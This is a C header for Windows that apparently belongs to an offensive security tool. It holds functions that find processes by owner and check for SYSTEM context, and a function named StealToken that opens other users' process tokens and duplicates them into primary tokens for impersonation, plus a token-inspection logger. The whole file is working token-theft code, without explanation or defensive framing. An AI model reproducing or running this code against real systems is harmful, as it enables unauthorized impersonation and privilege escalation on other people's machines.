#pragma once
#include <windows.h>
#include <winternl.h>
#include "debug.h"

// -----------------------------------------------------------------------------
// SYSTEM_PROCESS_INFORMATION (NtQuerySystemInformation class 5)
// winternl.h defines a minimal version - redefine only if not already full
// -----------------------------------------------------------------------------
#ifndef _MY_SYSTEM_PROCESS_INFORMATION_
#define _MY_SYSTEM_PROCESS_INFORMATION_
typedef struct _MY_SYSTEM_PROCESS_INFORMATION {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    BYTE           Reserved1[48];
    UNICODE_STRING ImageName;
    LONG           BasePriority;
    HANDLE         UniqueProcessId;
    PVOID          Reserved2;
    ULONG          HandleCount;
    ULONG          SessionId;
    PVOID          Reserved3;
    SIZE_T         PeakVirtualSize;
    SIZE_T         VirtualSize;
    ULONG          Reserved4;
    SIZE_T         PeakWorkingSetSize;
    SIZE_T         WorkingSetSize;
    PVOID          Reserved5;
    SIZE_T         QuotaPagedPoolUsage;
    PVOID          Reserved6;
    SIZE_T         QuotaNonPagedPoolUsage;
    SIZE_T         PagefileUsage;
    SIZE_T         PeakPagefileUsage;
    SIZE_T         PrivatePageCount;
    LARGE_INTEGER  Reserved7[6];
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;
#endif

#define SystemProcessInformation      5
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH   ((NTSTATUS)0xC0000004)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s)                 ((NTSTATUS)(s) >= 0)
#endif

typedef NTSTATUS (NTAPI *pfnNtQuerySystemInformation)(ULONG,PVOID,ULONG,PULONG);

// -----------------------------------------------------------------------------
// target struct
// -----------------------------------------------------------------------------
typedef struct _target { LPCSTR username; DWORD pid; } target, *ptarget;

// -----------------------------------------------------------------------------
// _IsSystem
// -----------------------------------------------------------------------------
static BOOL _IsSystem(void) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return FALSE;
    DWORD sz = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &sz);
    TOKEN_USER *pu = (TOKEN_USER*)VirtualAlloc(NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    BOOL sys = FALSE;
    if (pu && GetTokenInformation(hToken, TokenUser, pu, sz, &sz)) {
        PSID sid = NULL;
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        AllocateAndInitializeSid(&ntAuth,1,SECURITY_LOCAL_SYSTEM_RID,0,0,0,0,0,0,0,&sid);
        if (sid) { sys = EqualSid(pu->User.Sid, sid); FreeSid(sid); }
    }
    if (pu) VirtualFree(pu, 0, MEM_RELEASE);
    CloseHandle(hToken);
    return sys;
}

// -----------------------------------------------------------------------------
// StealToken
// pOutPid optionally receives the matched PID (used as fallback spoofPid)
// -----------------------------------------------------------------------------
static HANDLE StealToken(ptarget t, DWORD *pOutPid) {
    if (pOutPid) *pOutPid = 0;

    pfnNtQuerySystemInformation NtQSI =
        (pfnNtQuerySystemInformation)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    // by PID directly
    if (t->pid) {
        HANDLE hP = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, t->pid);
        if (!hP) { DBG_ERR("OpenProcess failed: 0x%08lX", GetLastError()); return NULL; }
        HANDLE hT=NULL, hPrim=NULL;
        if (OpenProcessToken(hP, TOKEN_QUERY|TOKEN_DUPLICATE, &hT)) {
            DuplicateTokenEx(hT, MAXIMUM_ALLOWED, NULL,
                             SecurityImpersonation, TokenPrimary, &hPrim);
            CloseHandle(hT);
        }
        CloseHandle(hP);
        if (hPrim && pOutPid) *pOutPid = t->pid;
        return hPrim;
    }

    if (!NtQSI) { DBG_ERR("NtQSI not found"); return NULL; }

    ULONG bufSz=1024*64; PVOID buf=NULL; NTSTATUS st;
    do {
        if (buf) VirtualFree(buf,0,MEM_RELEASE);
        buf = VirtualAlloc(NULL,bufSz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if (!buf) return NULL;
        st = NtQSI(SystemProcessInformation,buf,bufSz,&bufSz);
    } while (st==STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(st)) { VirtualFree(buf,0,MEM_RELEASE); return NULL; }

    BOOL   byName = (t->username && t->username[0]);
    HANDLE hPrim  = NULL;
    DWORD  matchedPid = 0;

    if (byName) DBG_INFO("StealToken: by username -> %s", t->username);
    else        DBG_INFO("StealToken: first non-SYSTEM process");

    PMY_SYSTEM_PROCESS_INFORMATION e = (PMY_SYSTEM_PROCESS_INFORMATION)buf;
    while (1) {
        DWORD pid = (DWORD)(ULONG_PTR)e->UniqueProcessId;
        if (pid > 4 && e->ImageName.Buffer) {
            HANDLE hP = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
            if (hP) {
                HANDLE hT=NULL;
                if (OpenProcessToken(hP, TOKEN_QUERY|TOKEN_DUPLICATE, &hT)) {
                    DWORD sz=0;
                    GetTokenInformation(hT,TokenUser,NULL,0,&sz);
                    TOKEN_USER *tu=(TOKEN_USER*)VirtualAlloc(NULL,sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
                    if (tu && GetTokenInformation(hT,TokenUser,tu,sz,&sz)) {
                        char un[256]={0},dn[256]={0}; DWORD ul=256,dl=256; SID_NAME_USE su;
                        if (LookupAccountSidA(NULL,tu->User.Sid,un,&ul,dn,&dl,&su)) {
                            BOOL match = byName ? (_stricmp(un,t->username)==0)
                                                : (_stricmp(dn,"NT AUTHORITY")!=0);
                            if (match) {
                                DBG_OK("Match PID %lu -> %s\\%s", pid, dn, un);
                                if (DuplicateTokenEx(hT,MAXIMUM_ALLOWED,NULL,
                                                     SecurityImpersonation,TokenPrimary,&hPrim))
                                    matchedPid = pid;
                            }
                        }
                    }
                    if (tu) VirtualFree(tu,0,MEM_RELEASE);
                    CloseHandle(hT);
                }
                CloseHandle(hP);
            }
        }
        if (hPrim||!e->NextEntryOffset) break;
        e=(PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)e+e->NextEntryOffset);
    }

    if (hPrim && pOutPid) *pOutPid = matchedPid;
    if (!hPrim) DBG_WARN("StealToken: no match found");
    VirtualFree(buf,0,MEM_RELEASE);
    return hPrim;
}

// -----------------------------------------------------------------------------
// FindProcessByUser
// Returns first PID owned by username matching optional procName filter.
// -----------------------------------------------------------------------------
static DWORD FindProcessByUser(LPCSTR username, LPCSTR procName) {
    if (!username||!username[0]) return 0;

    pfnNtQuerySystemInformation NtQSI =
        (pfnNtQuerySystemInformation)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;

    ULONG bufSz=1024*1024;
    BYTE *buf=(BYTE*)VirtualAlloc(NULL,bufSz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!buf) return 0;

    ULONG retLen=0;
    if (!NT_SUCCESS(NtQSI(SystemProcessInformation,buf,bufSz,&retLen))) {
        VirtualFree(buf,0,MEM_RELEASE); return 0;
    }

    BOOL  filterProc = (procName && procName[0]);
    DWORD found = 0;

    PMY_SYSTEM_PROCESS_INFORMATION spi=(PMY_SYSTEM_PROCESS_INFORMATION)buf;
    while (1) {
        DWORD pid=(DWORD)(ULONG_PTR)spi->UniqueProcessId;
        if (pid>4 && spi->ImageName.Buffer) {
            BOOL nameOk=TRUE;
            if (filterProc) {
                char img[256]={0};
                WideCharToMultiByte(CP_ACP,0,spi->ImageName.Buffer,
                                    spi->ImageName.Length/2,img,255,NULL,NULL);
                char *dot=strrchr(img,'.'), base[256]={0};
                if (dot) memcpy(base,img,dot-img); else strncpy(base,img,255);
                nameOk=(_stricmp(base,procName)==0||_stricmp(img,procName)==0);
            }
            if (nameOk) {
                HANDLE hP=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);
                if (hP) {
                    HANDLE hT=NULL;
                    if (OpenProcessToken(hP,TOKEN_QUERY,&hT)) {
                        DWORD sz=0; GetTokenInformation(hT,TokenUser,NULL,0,&sz);
                        TOKEN_USER *tu=(TOKEN_USER*)VirtualAlloc(NULL,sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
                        if (tu&&GetTokenInformation(hT,TokenUser,tu,sz,&sz)) {
                            char un[256]={0},dn[256]={0}; DWORD ul=256,dl=256; SID_NAME_USE su;
                            if (LookupAccountSidA(NULL,tu->User.Sid,un,&ul,dn,&dl,&su))
                                if (_stricmp(un,username)==0) found=pid;
                        }
                        if (tu) VirtualFree(tu,0,MEM_RELEASE);
                        CloseHandle(hT);
                    }
                    CloseHandle(hP);
                }
            }
        }
        if (found||!spi->NextEntryOffset) break;
        spi=(PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)spi+spi->NextEntryOffset);
    }
    VirtualFree(buf,0,MEM_RELEASE);

    if (found) DBG_OK("FindProcessByUser: PID %lu (proc=%s user=%s)",
                      found, procName?procName:"*", username);
    else       DBG_WARN("FindProcessByUser: no match (proc=%s user=%s)",
                        procName?procName:"*", username);
    return found;
}

// -----------------------------------------------------------------------------
// DumpTokenInfo - simplified: user, type, integrity, session, source
// -----------------------------------------------------------------------------
static void DumpTokenInfo(HANDLE hToken, const char *label) {
    DBG_SEPARATOR();
    DBG_INFO("=== %s ===", label);

    #define QTOK(cls,buf,sz) do { \
        DWORD _n=0; GetTokenInformation(hToken,(cls),NULL,0,&_n); (sz)=_n; \
        (buf)=_n?VirtualAlloc(NULL,_n,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE):NULL; \
        if((buf)&&!GetTokenInformation(hToken,(cls),(buf),_n,&_n)){VirtualFree((buf),0,MEM_RELEASE);(buf)=NULL;} \
    } while(0)

    // user
    { DWORD sz=0; TOKEN_USER *p=NULL; QTOK(TokenUser,p,sz);
      if (p) {
          char n[256]={0},d[256]={0}; DWORD nl=256,dl=256; SID_NAME_USE su;
          LookupAccountSidA(NULL,p->User.Sid,n,&nl,d,&dl,&su);
          DBG_INFO("  user      : %s\\%s", d, n);
          VirtualFree(p,0,MEM_RELEASE);
      }
    }

    // type + impersonation level
    { DWORD sz=0; TOKEN_TYPE *p=NULL; QTOK(TokenType,p,sz);
      if (p) {
          if (*p==TokenImpersonation) {
              DWORD sz2=0; SECURITY_IMPERSONATION_LEVEL *lvl=NULL;
              QTOK(TokenImpersonationLevel,lvl,sz2);
              const char *s[]={"Anonymous","Identification","Impersonation","Delegation"};
              DBG_INFO("  type      : Impersonation (%s)",
                       lvl&&*lvl<=SecurityDelegation?s[*lvl]:"?");
              if (lvl) VirtualFree(lvl,0,MEM_RELEASE);
          } else {
              DBG_INFO("  type      : Primary");
          }
          VirtualFree(p,0,MEM_RELEASE);
      }
    }

    // integrity
    { DWORD sz=0; TOKEN_MANDATORY_LABEL *p=NULL; QTOK(TokenIntegrityLevel,p,sz);
      if (p) {
          DWORD rid=*GetSidSubAuthority(p->Label.Sid,*GetSidSubAuthorityCount(p->Label.Sid)-1);
          const char *lvl=rid<0x1000?"Untrusted":rid==0x1000?"Low":rid==0x2000?"Medium":
                          rid==0x2100?"Medium+":rid==0x3000?"High":rid==0x4000?"System":"Protected";
          DBG_INFO("  integrity : %s (0x%04lX)", lvl, rid);
          VirtualFree(p,0,MEM_RELEASE);
      }
    }

    // session
    { DWORD sz=0; DWORD *p=NULL; QTOK(TokenSessionId,p,sz);
      if (p) { DBG_INFO("  session   : %lu", *p); VirtualFree(p,0,MEM_RELEASE); }
    }

    // source
    { DWORD sz=0; TOKEN_SOURCE *p=NULL; QTOK(TokenSource,p,sz);
      if (p) {
          char name[9]={0}; memcpy(name,p->SourceName,8);
          DBG_INFO("  source    : \"%s\"", name);
          VirtualFree(p,0,MEM_RELEASE);
      }
    }

    // auth id (logon session)
    { DWORD sz=0; TOKEN_STATISTICS *p=NULL; QTOK(TokenStatistics,p,sz);
      if (p) {
          DBG_INFO("  auth id   : %08lX:%08lX",
                   p->AuthenticationId.HighPart, p->AuthenticationId.LowPart);
          VirtualFree(p,0,MEM_RELEASE);
      }
    }

    DBG_SEPARATOR();
    #undef QTOK
}
